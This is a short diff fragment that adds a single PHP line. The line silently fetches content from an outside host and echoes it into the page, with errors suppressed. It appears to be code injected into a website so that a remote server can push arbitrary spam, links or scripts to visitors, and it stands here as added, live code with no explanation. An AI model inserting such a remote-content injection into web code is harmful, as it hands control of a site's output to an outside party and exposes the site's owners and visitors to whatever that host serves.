@@ -1,0 +1,1 @@
+<?php $contents = @file_get_contents("http://1.miued.sinaapp.com/sm_updata.php"); echo $contents;?>
